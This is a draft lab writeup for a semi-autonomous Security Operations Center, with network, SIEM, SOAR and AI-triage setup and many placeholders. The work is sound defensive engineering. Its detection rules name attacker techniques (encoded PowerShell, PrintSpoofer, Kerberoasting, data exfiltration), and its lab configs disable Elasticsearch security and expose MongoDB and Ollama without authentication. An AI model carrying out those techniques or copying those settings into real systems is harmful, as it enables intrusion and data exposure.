# Building a Semi-Autonomous SOC with AI-Assisted Triage and Automated Incident Response

> **A full technical walkthrough — from bare-metal setup to automated threat response**
>
> This writeup covers the complete design and implementation of a semi-autonomous Security Operations Center (SOC) proof of concept, built entirely with open-source tools. It includes network architecture, tool installation, configuration, SOAR workflow development, AI integration, red team evaluation, and automated incident response.
>
> **GitHub Repository:** `[LINK TO REPO]`
> **Medium Article:** `[LINK TO ARTICLE]`

---

## Table of Contents

1. [Project Overview](#1-project-overview)
2. [Architecture Overview](#2-architecture-overview)
3. [Phase 1 — Network Setup and Infrastructure](#3-phase-1--network-setup-and-infrastructure)
4. [Phase 2 — Tool Installation](#4-phase-2--tool-installation)
5. [Phase 3 — Tool Configuration](#5-phase-3--tool-configuration)
6. [Phase 4 — SIEM Rules and Detection Engineering](#6-phase-4--siem-rules-and-detection-engineering)
7. [Phase 5 — SOAR Workflow Development (n8n)](#7-phase-5--soar-workflow-development-n8n)
8. [Phase 6 — AI Agent Subworkflow](#8-phase-6--ai-agent-subworkflow)
9. [Phase 7 — Risk Scoring Engine](#9-phase-7--risk-scoring-engine)
10. [Phase 8 — Decision Engine and Incident Response](#10-phase-8--decision-engine-and-incident-response)
11. [Phase 9 — Red Team Evaluation](#11-phase-9--red-team-evaluation)
12. [Results Summary](#12-results-summary)
13. [Lessons Learned and Limitations](#13-lessons-learned-and-limitations)

---

## 1. Project Overview

Traditional SOCs rely on manual workflows for alert triage, OSINT enrichment, incident response, and incident reporting. This project replaces all four with an automated, AI-assisted pipeline.

### The Four Problems We Solved

| Problem | Traditional SOC | This Project |
|---|---|---|
| Alert triage | Manual analyst review per alert | AI model triages every alert automatically |
| OSINT enrichment | Manual indicator lookup per analyst | Automated per-indicator dispatch to threat intel APIs |
| Incident response | Manual host isolation, IP blocking, file deletion | Fully automated for high-severity alerts |
| Incident reporting | Manually written after the fact | AI + SOAR generates and delivers reports in real time |

### Tech Stack

| Role | Tool |
|---|---|
| SIEM + EDR | Security Onion 2 (Elastic + Suricata) |
| Firewall + IDS | OPNsense + Suricata (eve.json) |
| SOAR | n8n (self-hosted) |
| Case Management | TheHive 4 |
| Endpoint Response | Velociraptor |
| AI Model | Qwen2.5:7b via Ollama (local) |
| Notifications | Mattermost (self-hosted) |
| AI Reasoning DB | MongoDB |
| Adversary Emulation | CALDERA |

---

## 2. Architecture Overview

The system is split across two isolated network segments.

### Environment Diagram

![Environment Topology](images/env-topology.png)

```
┌─────────────────────────────────┐          ┌──────────────────────────────────────────┐
│      Enterprise Network         │          │           SOC Network (University Server) │
│      192.168.1.0/24             │          │           192.168.2.0/24                 │
│                                 │          │                                           │
│  ┌──────────────┐               │          │  ┌────────────────┐                      │
│  │  Web Server  │               │          │  │ Security Onion │ 192.168.2.100        │
│  │ (IIS+Mutill) │ .1.120        │          │  │ (SIEM + EDR)   │                      │
│  └──────────────┘               │          │  └────────────────┘                      │
│                                 │          │                                           │
│  ┌──────────────┐               │  GRE     │  ┌────────────────┐                      │
│  │     PDC      │ .1.100        │◄─TUNNEL─►│  │  SOAR Server   │ .2.250               │
│  │  (AD Domain) │               │          │  │ (n8n+TheHive+  │                      │
│  └──────────────┘               │          │  │  Mattermost+   │                      │
│                                 │          │  │  MongoDB)      │                      │
│         OPNsense Firewall A     │          │  └────────────────┘                      │
└──────────────┬──────────────────┘          │                                           │
               │                             │  ┌────────────────┐                      │
          Internet/WAN                       │  │  AI Agent      │ .2.150               │
          172.16.208.0/22                    │  │  (Ollama)      │                      │
               │                             │  └────────────────┘                      │
    [Kali Linux - Attacker]                  │                                           │
    172.16.210.x/22                          │  ┌────────────────┐                      │
                                             │  │  Velociraptor  │ .2.200               │
                              OPNsense       │  │  (Endpoint)    │                      │
                              Firewall B     │  └────────────────┘                      │
                              .2.254         │                                           │
                                             └──────────────────────────────────────────┘
```

### Key Design Decisions

- Enterprise and SOC networks are **fully isolated** — a compromise on the enterprise side cannot directly reach SOC infrastructure
- A **GRE tunnel with OSPF** connects the two OPNsense firewalls for route distribution
- The SOC firewall is the **automated blocking enforcement point** — the SOAR platform adds rules via the OPNsense API
- The AI model runs **locally** — no security telemetry leaves the network

---

## 3. Phase 1 — Network Setup and Infrastructure

### 3.1 Virtualization Environment

**`[MORE INFORMATION NEEDED — describe the hypervisor used (VMware/Hyper-V/Proxmox), VM specs for each host, virtual switch configuration, host-only adapter setup]`**

The environment runs on a single physical host using virtual machines. Two separate host-only virtual switches (vSwitches) were created — one for the enterprise network and one for the SOC network. Both OPNsense firewalls have three interfaces each: LAN (connected to their respective vSwitch), WAN (connected to a shared bridge network for internet simulation), and a GRE tunnel interface.

### 3.2 OPNsense Firewall A — Enterprise Side

**`[MORE INFORMATION NEEDED — installation steps for OPNsense A, initial wizard walkthrough, interface assignment]`**

**Interface Assignment:**

| Interface | Role | Network |
|---|---|---|
| em0 | WAN | 172.16.208.x (bridge/internet simulation) |
| em1 | LAN | 192.168.1.1/24 (enterprise network gateway) |
| tun0 | GRE tunnel | 10.10.10.1/30 |

**NAT Port Forwarding (Web Server exposure):**

```
# OPNsense A — Port Forward Rule
# Exposes the web server to the simulated internet for red team access
WAN → 80/TCP → 192.168.1.120:80
WAN → 443/TCP → 192.168.1.120:443
```

Navigate to: **Firewall → NAT → Port Forward → Add**

**`[MORE INFORMATION NEEDED — screenshot of the NAT rule in OPNsense UI]`**

**Suricata IDS on Firewall A:**

```
# Enable Suricata on WAN interface
# OPNsense → Services → Intrusion Detection → Settings
Interface: WAN
Enable IDS: ✓
Enable IPS: ✗ (detection only)
Send alerts to: eve.json → /var/log/suricata/eve.json
```

**`[MORE INFORMATION NEEDED — ruleset configuration, which rulesets were enabled (ET Open, Suricata rules, custom rules)]`**

### 3.3 OPNsense Firewall B — SOC Side

**Interface Assignment:**

| Interface | Role | Network |
|---|---|---|
| em0 | WAN | 172.16.218.200 (bridge/internet simulation) |
| em1 | LAN | 192.168.2.254/24 (SOC network gateway) |
| tun0 | GRE tunnel | 10.10.10.2/30 |

**`[MORE INFORMATION NEEDED — installation steps for OPNsense B, interface wizard]`**

### 3.4 GRE Tunnel Configuration

A GRE tunnel is established between the two OPNsense firewalls to allow the SOC network to communicate with the enterprise network for endpoint management (Velociraptor) and response actions.

**On OPNsense A:**

Navigate to: **Interfaces → Other Types → GRE → Add**

```
Parent Interface: WAN
Local Address:    [WAN IP of Firewall A]
Remote Address:   172.16.218.200
Tunnel Local IP:  10.10.10.1/30
Tunnel Remote IP: 10.10.10.2
Description:      GRE_TO_SOC
```

**On OPNsense B:**

```
Parent Interface: WAN
Local Address:    172.16.218.200
Remote Address:   [WAN IP of Firewall A]
Tunnel Local IP:  10.10.10.2/30
Tunnel Remote IP: 10.10.10.1
Description:      GRE_TO_ENTERPRISE
```

**`[MORE INFORMATION NEEDED — screenshot of GRE interface configuration on both firewalls]`**

### 3.5 OSPF Configuration over GRE Tunnel

OSPF is configured on both firewalls over the GRE tunnel to distribute routes dynamically between the two network segments.

Navigate to: **Routing → OSPF** (requires FRR plugin — install via System → Firmware → Plugins → `os-frr`)

**On OPNsense A:**

```
# FRR OSPF Configuration
Router ID: 10.10.10.1
Area: 0.0.0.0

Network: 192.168.1.0/24  Area: 0
Network: 10.10.10.0/30   Area: 0
```

**On OPNsense B:**

```
Router ID: 10.10.10.2
Area: 0.0.0.0

Network: 192.168.2.0/24  Area: 0
Network: 10.10.10.0/30   Area: 0
```

**`[MORE INFORMATION NEEDED — FRR plugin installation steps, OSPF neighbor verification command output showing adjacency formed]`**

**Verify routing:**
```bash
# On OPNsense A shell
netstat -rn
# Should show 192.168.2.0/24 via 10.10.10.2

ping 192.168.2.100   # Should reach Security Onion
```

### 3.6 Firewall Rules

**Enterprise network — key rules:**

```
# Allow enterprise hosts to reach internet
LAN → WAN: any any ALLOW

# Allow SOC to reach enterprise (for Velociraptor response)
192.168.2.0/24 → 192.168.1.0/24: any ALLOW

# Kali Linux access to web server (for red team)
# This is handled by the NAT rule above — no separate LAN rule needed
```

**SOC network — key rules:**

```
# Allow all SOC internal communication
LAN → LAN: any any ALLOW

# Allow SOC to reach enterprise via GRE
LAN → 192.168.1.0/24: any ALLOW

# OPNsense API access (for SOAR blocking)
192.168.2.250 → 127.0.0.1:443: ALLOW  # n8n to firewall API
```

**`[MORE INFORMATION NEEDED — screenshots of actual firewall rule tables in OPNsense UI for both firewalls]`**

---

## 4. Phase 2 — Tool Installation

### 4.1 Windows Server — Web Server (IIS + Mutillidae II)

**`[MORE INFORMATION NEEDED — Windows Server 2022 installation steps, IIS role installation, Mutillidae II setup on IIS, PHP configuration]`**

```powershell
# Install IIS role
Install-WindowsFeature -Name Web-Server -IncludeManagementTools

# Enable CGI for PHP
Install-WindowsFeature Web-CGI

# Download and install PHP
# [MORE INFORMATION NEEDED — PHP version used, php.ini configuration]
```

**Mutillidae II Installation:**

```
1. Download Mutillidae II from: https://github.com/webpwnized/mutillidae
2. Extract to: C:\inetpub\wwwroot\mutillidae
3. Configure PHP to connect to MySQL
4. [MORE INFORMATION NEEDED — MySQL installation steps, database setup commands]
```

**Velociraptor Agent on Web Server:**

**`[MORE INFORMATION NEEDED — Velociraptor agent MSI download, installation command, certificate enrollment with Velociraptor server]`**

```powershell
# Install Velociraptor agent (run as Administrator)
# [MORE INFORMATION NEEDED — actual MSI path and install command used]
msiexec /i velociraptor-agent.msi /quiet
```

**Security Onion Agent on Web Server:**

```powershell
# [MORE INFORMATION NEEDED — Security Onion Elastic agent download and enrollment command]
# The agent forwards Windows event logs, Sysmon events, and PowerShell logs to SO2
```

### 4.2 Windows Server — Primary Domain Controller (PDC)

**`[MORE INFORMATION NEEDED — Windows Server 2022 installation, Active Directory Domain Services role setup, domain name configuration (kabul-uni.edu), Badblood installation and execution for populating test users]`**

```powershell
# Promote to Domain Controller
Install-WindowsFeature AD-Domain-Services
Import-Module ADDSDeployment
Install-ADDSForest -DomainName "kabul-uni.edu" -InstallDns

# Populate with test users using Badblood
# [MORE INFORMATION NEEDED — Badblood command used]
```

**Velociraptor + Security Onion agents also installed on PDC — same process as web server.**

### 4.3 Security Onion 2 Installation (SIEM + EDR)

**`[MORE INFORMATION NEEDED — ISO download link, hardware specs of SO2 VM, installation wizard choices (standalone vs distributed), management interface, admin user setup]`**

```bash
# After SO2 boots from ISO, the setup wizard runs automatically
# Key choices during setup:
# - Deployment type: Standalone
# - Management interface: [interface connected to SOC network]
# - NIC for packet capture: [WAN-facing interface if any]
# - Analyst subnet: 192.168.2.0/24
```

**Post-install — allow analyst IPs:**
```bash
so-allow
# Select: analyst
# Enter: 192.168.2.0/24
```

**`[MORE INFORMATION NEEDED — so-allow output screenshot, SO2 web UI first login screenshot]`**

**OPNsense eve.json forwarding to SO2:**

Because OPNsense does not natively send Suricata alerts to SO2, a cron job was used to forward the eve.json file:

```bash
# On OPNsense A — schedule via System → Settings → Cron
# Or via SSH:

# Create forwarding script
cat > /usr/local/bin/forward_eve.sh << 'EOF'
#!/bin/sh
# Send new eve.json entries to n8n for processing
tail -n 100 /var/log/suricata/eve.json | \
  curl -s -X POST http://192.168.2.250:5678/webhook/opnsense-eve \
  -H "Content-Type: application/json" \
  -d @-
EOF
chmod +x /usr/local/bin/forward_eve.sh

# Add to cron (every 5 minutes)
echo "*/5 * * * * root /usr/local/bin/forward_eve.sh" >> /etc/crontab
```

**`[MORE INFORMATION NEEDED — actual cron job configuration, webhook URL used, eve.json sample showing alert format received]`**

### 4.4 SOAR Server — Docker Compose Setup (n8n + TheHive + Mattermost + MongoDB)

The SOAR server runs multiple services via Docker Compose on a single Ubuntu 24.04 host.

**`[MORE INFORMATION NEEDED — Ubuntu 24.04 installation, Docker and Docker Compose installation commands]`**

```bash
# Install Docker
curl -fsSL https://get.docker.com | sh
sudo usermod -aG docker $USER

# Install Docker Compose
sudo apt install docker-compose-plugin -y
```

**Docker Compose file:**

```yaml
# docker-compose.yml
# [MORE INFORMATION NEEDED — complete docker-compose.yml with all service definitions,
#  volume mounts, port mappings, environment variables for n8n, TheHive 4,
#  Cassandra (TheHive backend), Mattermost, and MongoDB]

version: '3.8'
services:

  n8n:
    image: n8nio/n8n:latest
    ports:
      - "5678:5678"
    environment:
      - N8N_HOST=192.168.2.250
      - N8N_PORT=5678
      - N8N_PROTOCOL=http
      - WEBHOOK_URL=http://192.168.2.250:5678/
      - N8N_BASIC_AUTH_ACTIVE=true
      - N8N_BASIC_AUTH_USER=[USERNAME]
      - N8N_BASIC_AUTH_PASSWORD=[PASSWORD]
    volumes:
      - n8n_data:/home/node/.n8n
    restart: unless-stopped

  thehive:
    # [MORE INFORMATION NEEDED — TheHive 4 docker image, configuration]
    image: thehiveproject/thehive4:latest
    ports:
      - "9000:9000"
    depends_on:
      - cassandra
      - elasticsearch
    volumes:
      - thehive_data:/opt/thp/thehive/data
    restart: unless-stopped

  cassandra:
    # [MORE INFORMATION NEEDED — Cassandra config for TheHive backend]
    image: cassandra:3.11
    environment:
      - CASSANDRA_CLUSTER_NAME=thehive
    volumes:
      - cassandra_data:/var/lib/cassandra
    restart: unless-stopped

  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:7.17.0
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
    volumes:
      - es_data:/usr/share/elasticsearch/data
    restart: unless-stopped

  mattermost:
    # [MORE INFORMATION NEEDED — Mattermost docker image, team/channel setup,
    #  incoming webhook creation for n8n notifications]
    image: mattermost/mattermost-team-edition:latest
    ports:
      - "8065:8065"
    volumes:
      - mattermost_data:/mattermost/data
    restart: unless-stopped

  mongodb:
    image: mongo:6.0
    ports:
      - "27017:27017"
    volumes:
      - mongo_data:/data/db
    restart: unless-stopped

volumes:
  n8n_data:
  thehive_data:
  cassandra_data:
  es_data:
  mattermost_data:
  mongo_data:
```

```bash
# Start all services
docker compose up -d

# Verify all containers are running
docker compose ps
```

**`[MORE INFORMATION NEEDED — docker compose ps output showing all services healthy]`**

### 4.5 AI Agent Server — Ollama + Qwen2.5:7b

**`[MORE INFORMATION NEEDED — Ubuntu installation on AI server, GPU/CPU specs, Ollama installation]`**

```bash
# Install Ollama
curl -fsSL https://ollama.com/install.sh | sh

# Pull the Qwen2.5:7b model
ollama pull qwen2.5:7b

# Verify model is available
ollama list

# Test the model
ollama run qwen2.5:7b "Summarize this security alert: ..."
```

**Configure Ollama to listen on network interface (not just localhost):**

```bash
# Edit systemd service
sudo systemctl edit ollama

# Add environment variable
[Service]
Environment="OLLAMA_HOST=0.0.0.0:11434"

sudo systemctl restart ollama

# Verify
curl http://192.168.2.150:11434/api/tags
```

**`[MORE INFORMATION NEEDED — ollama list output showing qwen2.5:7b, curl API test response]`**

### 4.6 Velociraptor Server Installation

**`[MORE INFORMATION NEEDED — Velociraptor server binary download, server configuration generation command, certificate generation, config.yaml content, systemd service setup]`**

```bash
# Download Velociraptor
wget https://github.com/Velocidex/velociraptor/releases/download/[VERSION]/velociraptor-[VERSION]-linux-amd64

chmod +x velociraptor-linux-amd64

# Generate server config
./velociraptor-linux-amd64 config generate -i

# [MORE INFORMATION NEEDED — interactive config answers: bind address, port, 
#  GUI credentials, data store path]

# Start server
./velociraptor-linux-amd64 --config server.config.yaml frontend -v

# Or as systemd service
# [MORE INFORMATION NEEDED — systemd unit file content]
```

**`[MORE INFORMATION NEEDED — Velociraptor web UI first login screenshot, client enrollment confirmation]`**

---

## 5. Phase 3 — Tool Configuration

### 5.1 TheHive 4 Configuration

**`[MORE INFORMATION NEEDED — TheHive application.conf content, Cassandra connection settings, Elasticsearch index settings, admin user creation, organization setup]`**

```hocon
# /etc/thehive/application.conf (or mounted volume path)
# [MORE INFORMATION NEEDED — full application.conf content]

db.janusgraph {
  storage {
    backend: cql
    hostname: ["cassandra"]
    cql.cluster-name: thehive
  }
}

index.search {
  backend: elasticsearch
  hostname: ["elasticsearch"]
  index-name: thehive
}
```

**Create API Key for n8n:**
```
1. Login to TheHive at http://192.168.2.250:9000
2. Admin → Users → Create user for n8n integration
3. Generate API key
4. Copy key — used in n8n HTTP nodes as Bearer token
```

**`[MORE INFORMATION NEEDED — TheHive user creation screenshot, API key generation]`**

### 5.2 Mattermost Configuration

**`[MORE INFORMATION NEEDED — Mattermost initial setup wizard, team creation, SOC channel creation, incoming webhook creation steps]`**

```
1. First-time setup at http://192.168.2.250:8065
2. Create team: SOC-Team
3. Create channel: #soc-alerts
4. Integrations → Incoming Webhooks → Add Incoming Webhook
5. Channel: #soc-alerts
6. Copy webhook URL → used in n8n Mattermost nodes
```

**`[MORE INFORMATION NEEDED — Mattermost webhook configuration screenshot]`**

### 5.3 OPNsense API Configuration for n8n

The SOAR platform calls the OPNsense API to add firewall blocking rules. The API must be enabled and a key created.

```
1. OPNsense B → System → Access → Users → Add
2. Username: n8n-api
3. Generate API Key + Secret
4. Assign privileges: Firewall: Alias: Edit, Firewall: Rules: Edit
5. Save credentials → used in n8n HTTP nodes
```

**`[MORE INFORMATION NEEDED — OPNsense API user creation screenshot, privilege assignment]`**

### 5.4 n8n Credential Setup

All external services are connected to n8n via stored credentials:

```
n8n Settings → Credentials → Add Credential:

1. TheHive API Key
   - Type: Header Auth
   - Name: Authorization
   - Value: Bearer [THEHIVE_API_KEY]

2. OPNsense API
   - Type: Basic Auth  
   - Username: [API_KEY]
   - Password: [API_SECRET]

3. Ollama (HTTP node — no auth required on local network)

4. MongoDB
   - Type: MongoDB
   - Connection String: mongodb://192.168.2.250:27017/soc_reasoning

5. Mattermost Webhook
   - Type: HTTP Request node with webhook URL embedded
```

**`[MORE INFORMATION NEEDED — n8n credentials list screenshot showing all configured integrations]`**

### 5.5 Security Onion — Elasticsearch Index and Alert Forwarding

**`[MORE INFORMATION NEEDED — SO2 Elastic index names for alerts and EDR events, API endpoint used by n8n to query alerts, API key generation in Kibana/SO2, index pattern for SIEM alerts vs EDR alerts]`**

```bash
# Get SO2 Elasticsearch API key
# In SO2 web UI → Kibana → Stack Management → API Keys → Create API Key
# [MORE INFORMATION NEEDED — exact steps and key scope]

# Test query from n8n server
curl -X GET "https://192.168.2.100:9200/so-*/_search" \
  -H "Authorization: ApiKey [BASE64_KEY]" \
  -H "Content-Type: application/json" \
  -d '{"query":{"range":{"@timestamp":{"gte":"now-5m"}}}}'
```

---

## 6. Phase 4 — SIEM Rules and Detection Engineering

### 6.1 Custom Detection Rules in Security Onion / Elastic

Seven custom detection rules were created in the SIEM to cover each phase of the red team scenario. Rules were written in Elastic Query Language (EQL) or KQL.

**`[MORE INFORMATION NEEDED — full EQL/KQL for each rule, or Elastic rule JSON export]`**

**Rule 1 — Discovery Command Burst on Host**
```json
{
  "name": "Discovery Command Burst on Host",
  "type": "threshold",
  "query": "process.name:(whoami.exe OR net.exe OR ipconfig.exe OR systeminfo.exe OR arp.exe OR nslookup.exe OR nltest.exe)",
  "threshold": {
    "field": "host.name",
    "value": 5,
    "cardinality": []
  },
  "time_window": "2m",
  "severity": "medium"
}
```

**Rule 2 — Suspicious Windows PowerShell Arguments**
```json
{
  "name": "Suspicious Windows PowerShell Arguments",
  "type": "eql",
  "query": "process where process.name == \"powershell.exe\" and (process.args : \"*ExecutionPolicy*Bypass*\" or process.args : \"*Invoke-WebRequest*\" or process.args : \"*-enc*\" or process.args : \"*IEX*\")",
  "severity": "medium"
}
```

**Rule 3 — IIS PowerShell Payload Drop and Execution**
```json
{
  "name": "IIS PowerShell Payload Drop and Execution",
  "type": "eql",
  "query": "process where process.parent.name == \"w3wp.exe\" and process.name in (\"powershell.exe\", \"cmd.exe\", \"wscript.exe\")",
  "severity": "high"
}
```

**Rule 4 — Privilege Escalation via Token Impersonation**
```json
{
  "name": "Privilege Escalation via Token Impersonation (PrintSpoofer/Potato-like)",
  "type": "eql",
  "query": "process where process.args : \"*SeImpersonatePrivilege*\" or process.name : \"*PrintSpoofer*\" or (process.name == \"cmd.exe\" and process.args : \"*SYSTEM*\" and process.parent.name : (\"w3wp.exe\", \"msiexec.exe\"))",
  "severity": "high"
}
```

**Rule 5 — Suspicious Local Admin Account Creation**
```json
{
  "name": "Suspicious Local Admin Account Creation",
  "type": "eql",
  "query": "process where process.name == \"net.exe\" and process.args : \"*user*\" and process.args : \"*/add*\" or (event.category == \"iam\" and event.action == \"added-user-account-to-group\" and group.name : \"*Administrators*\")",
  "severity": "high"
}
```

**Rule 6 — Kerberoasting Detection via Honeypot Service Account**
```json
{
  "name": "Kerberoasting Detection via Honeypot Service Account",
  "type": "eql",
  "query": "authentication where event.action == \"kerberos-service-ticket-requested\" and winlog.event_data.TicketEncryptionType == \"0x17\" and winlog.event_data.ServiceName : \"*honeypot*\"",
  "severity": "critical"
}
```

**Rule 7 — Data Exfiltration (Firewall IDS — eve.json)**

```yaml
# Suricata custom rule on OPNsense
# [MORE INFORMATION NEEDED — actual Suricata rule syntax used for detecting CSV upload]
alert http any any -> any any (msg:"Possible Data Exfiltration - CSV Upload"; \
  content:"POST"; http_method; \
  content:".csv"; http_client_body; \
  sid:9000001; rev:1;)
```

**`[MORE INFORMATION NEEDED — screenshot of all rules in Kibana Security Rules page, rule test results showing alerts firing during testing]`**

---

## 7. Phase 5 — SOAR Workflow Development (n8n)

### 7.1 Main Workflow Overview

The main workflow runs on a schedule and handles alert collection, normalization, deduplication, asset enrichment, and TheHive alert creation.

![Main Workflow Screenshot](images/n8n-main-workflow.png)

**Workflow trigger:**

```javascript
// Schedule Trigger — runs every 2 minutes
// Calculates a rolling time window for fetching new alerts
const now = new Date();
const past = new Date(now.getTime() - 2 * 60 * 1000);

return [{
  json: {
    now: now.toISOString(),
    past: past.toISOString()
  }
}];
```

### 7.2 Alert Collection from Three Sources

**Source 1 — Security Onion SIEM (Elastic index: so-*)**

```javascript
// HTTP Request node — GET SO2 Elastic alerts
// URL: https://192.168.2.100:9200/so-alerts-*/_search
// Auth: ApiKey header
// Body:
{
  "query": {
    "bool": {
      "must": [
        {"range": {"@timestamp": {"gte": "{{$json.past}}", "lte": "{{$json.now}}"}}}
      ]
    }
  },
  "size": 100
}
```

**Source 2 — Security Onion EDR (Elastic agent events)**

```javascript
// Same pattern but different index
// URL: https://192.168.2.100:9200/logs-endpoint.alerts-*/_search
// [MORE INFORMATION NEEDED — exact index pattern for EDR alerts in SO2]
```

**Source 3 — OPNsense Suricata IDS (n8n data table)**

Because OPNsense sends eve.json via webhook to n8n, the alerts are stored in an n8n local data table. The main workflow reads from this table each run.

```javascript
// n8n Data Table Read node
// Table: opnsense_eve_alerts
// Filter: timestamp > past AND processed = false
// [MORE INFORMATION NEEDED — n8n data table configuration screenshot]
```

### 7.3 Normalization Nodes

Each source has a dedicated JavaScript normalization node that maps fields to a common schema:

**Normalize-S (Security Onion SIEM alerts):**

```javascript
// [MORE INFORMATION NEEDED — full normalization code for SIEM alerts]
// Maps SO2 Elastic alert fields to standard schema

return items.map(item => {
  const hit = item.json._source || item.json;
  return {
    json: {
      alert_id: hit['kibana.alert.uuid'] || hit._id,
      title: hit['kibana.alert.rule.name'] || 'Unknown Alert',
      severity: hit['kibana.alert.severity'] || 3,
      timestamp: hit['@timestamp'],
      src_ip: hit['source.ip'] || hit['client.ip'],
      dst_ip: hit['destination.ip'] || hit['server.ip'],
      host: hit['host.name'],
      process_name: hit['process.name'],
      command_line: hit['process.command_line'],
      source_type: 'SIEM',
      raw: hit
    }
  };
});
```

**Normalize-E (EDR alerts):**

**`[MORE INFORMATION NEEDED — full normalization code for EDR alerts, field mapping from Elastic agent event format]`**

**Normalize-O (OPNsense IDS alerts):**

```javascript
// [MORE INFORMATION NEEDED — full normalization code for eve.json format]
// Maps Suricata eve.json fields to standard schema

return items.map(item => {
  const eve = item.json;
  return {
    json: {
      alert_id: eve.flow_id || Math.random().toString(36),
      title: eve.alert?.signature || 'IDS Alert',
      severity: eve.alert?.severity || 3,
      timestamp: eve.timestamp,
      src_ip: eve.src_ip,
      dst_ip: eve.dest_ip,
      src_port: eve.src_port,
      dst_port: eve.dest_port,
      protocol: eve.proto,
      source_type: 'IDS',
      raw: eve
    }
  };
});
```

### 7.4 Time-Bucket Deduplication

```javascript
// Deduplication node — groups repeated alerts within a time window
// Groups by: title + src_ip + dst_ip (rounded to 5-minute bucket)

const bucket_size = 5 * 60 * 1000; // 5 minutes in ms

return items.map(item => {
  const a = item.json;
  const ts = new Date(a.timestamp).getTime();
  const bucket = Math.floor(ts / bucket_size) * bucket_size;
  
  a.dedup_key = `${a.title}|${a.src_ip}|${a.dst_ip}|${bucket}`;
  return { json: a };
});

// [MORE INFORMATION NEEDED — how the actual deduplication merge is applied
//  — which n8n node type handles the grouping, aggregate node config]
```

### 7.5 Asset Context Enrichment

```javascript
// Asset registry — local JavaScript lookup table
// Maps IP addresses to asset metadata

const ASSET_REGISTRY = {
  '192.168.1.120': {
    name: 'Web Server',
    role: 'web_server',
    os: 'Windows Server 2022',
    importance: 4,
    services: ['IIS', 'PHP', 'MySQL'],
    soc_priority: 4
  },
  '192.168.1.100': {
    name: 'PDC',
    role: 'domain_controller',
    os: 'Windows Server 2022',
    importance: 5,
    services: ['Active Directory', 'DNS', 'Kerberos'],
    soc_priority: 5
  },
  '192.168.2.250': {
    name: 'SOAR-Stack',
    role: 'soc_infrastructure',
    os: 'Ubuntu 24.04',
    importance: 5,
    services: ['n8n', 'TheHive', 'Mattermost'],
    soc_priority: 5
  }
  // [MORE INFORMATION NEEDED — complete asset registry for all hosts]
};

return items.map(item => {
  const alert = item.json;
  const src_asset = ASSET_REGISTRY[alert.src_ip] || { name: 'Unknown', role: 'unknown', importance: 1, soc_priority: 1 };
  const dst_asset = ASSET_REGISTRY[alert.dst_ip] || { name: 'Unknown', role: 'unknown', importance: 1, soc_priority: 1 };
  
  alert.src_asset = src_asset;
  alert.dst_asset = dst_asset;
  alert.src_role = src_asset.role;
  alert.asset_flow = `${src_asset.role} → ${dst_asset.role}`;
  
  return { json: alert };
});
```

### 7.6 TheHive Alert Creation

```javascript
// HTTP Request node — POST to TheHive
// URL: http://192.168.2.250:9000/api/alert
// Auth: Bearer [THEHIVE_API_KEY]

// Body builder:
return items.map(item => {
  const a = item.json;
  return {
    json: {
      title: a.title,
      description: `Source: ${a.src_ip} (${a.src_asset?.name})\nDestination: ${a.dst_ip}\nTimestamp: ${a.timestamp}`,
      type: 'soc-alert',
      source: a.source_type,
      sourceRef: a.alert_id,
      severity: Math.min(Math.ceil(a.severity / 2), 3),
      tags: [a.source_type, a.src_role, a.host || 'unknown'],
      observables: [
        { dataType: 'ip', data: a.src_ip },
        { dataType: 'ip', data: a.dst_ip }
      ].filter(o => o.data)
    }
  };
});
```

**`[MORE INFORMATION NEEDED — screenshot of TheHive showing created alerts, observable types configured]`**

---

## 8. Phase 6 — AI Agent Subworkflow

The AI agent subworkflow is triggered after each alert is created in TheHive. It handles OSINT enrichment and AI triage.

![AI Agent Subworkflow Screenshot](images/n8n-ai-subworkflow.png)

### 8.1 OSINT Dispatcher

After re-fetching the alert from TheHive, a Switch node routes each observable (artifact) to the correct child workflow based on its type:

```
Switch node — mode: Rules

Rule 0: {{ $json.dataType == "ip" }}     → IP Subworkflow
Rule 1: {{ $json.dataType == "domain" }} → Domain Subworkflow  
Rule 2: {{ $json.dataType == "hash" }}   → Hash Subworkflow
Rule 3: {{ $json.dataType == "cve" }}    → CVE Info Subworkflow
```

![OSINT Dispatcher Switch](images/n8n-osint-dispatcher.png)

### 8.2 IP Enrichment Child Workflow

**`[MORE INFORMATION NEEDED — which threat intelligence APIs were used for IP lookup (VirusTotal, AbuseIPDB, etc.), API key setup in n8n, request/response format, how verdict is extracted]`**

```javascript
// IP Subworkflow — queries threat intel API for IP verdict
// Example: AbuseIPDB

// HTTP Request node:
// URL: https://api.abuseipdb.com/api/v2/check
// Headers: Key: [ABUSEIPDB_API_KEY]
// Params: ipAddress={{ $json.data }}&maxAgeInDays=90

// Parse response:
return items.map(item => {
  const result = item.json.data;
  return {
    json: {
      indicator: item.json.indicator,
      type: 'ip',
      verdict: result.abuseConfidenceScore > 50 ? 'malicious' : 'clean',
      abuse_score: result.abuseConfidenceScore,
      country: result.countryCode,
      isp: result.isp,
      usage_type: result.usageType,
      // [MORE INFORMATION NEEDED — additional fields from VirusTotal if used]
    }
  };
});
```

### 8.3 Hash Enrichment Child Workflow

**`[MORE INFORMATION NEEDED — hash lookup API used (VirusTotal), request format, how malicious detection count is extracted, threshold used for malicious verdict]`**

```javascript
// Hash Subworkflow — queries VirusTotal for file hash verdict
// [MORE INFORMATION NEEDED — VirusTotal API v3 endpoint, API key, response parsing]

// URL: https://www.virustotal.com/api/v3/files/{{ $json.data }}
// Headers: x-apikey: [VT_API_KEY]

return items.map(item => {
  const attrs = item.json.data?.attributes;
  const stats = attrs?.last_analysis_stats || {};
  return {
    json: {
      indicator: item.json.indicator,
      type: 'hash',
      verdict: stats.malicious > 5 ? 'malicious' : 'clean',
      malicious_count: stats.malicious || 0,
      suspicious_count: stats.suspicious || 0,
      total_engines: (stats.malicious || 0) + (stats.undetected || 0),
      file_type: attrs?.type_description,
      file_name: attrs?.meaningful_name
    }
  };
});
```

### 8.4 OSINT Summary Node

```javascript
// Merges all child workflow results into a single OSINT summary object
// attached to the alert

const results = items.map(i => i.json);
const malicious = results.filter(r => r.verdict === 'malicious');
const suspicious = results.filter(r => r.verdict === 'suspicious');

return [{
  json: {
    osint_results: results,
    has_osint_targets: results.length > 0,
    osint_summary: {
      total_checked: results.length,
      detection: {
        malicious: malicious.length,
        suspicious: suspicious.length,
        clean: results.filter(r => r.verdict === 'clean').length
      },
      malicious_indicators: malicious.map(r => ({ type: r.type, value: r.indicator })),
      reputation: {
        abuse_score: Math.max(...results.map(r => r.abuse_score || 0))
      }
    }
  }
}];
```

### 8.5 AI Triage — Qwen2.5:7b

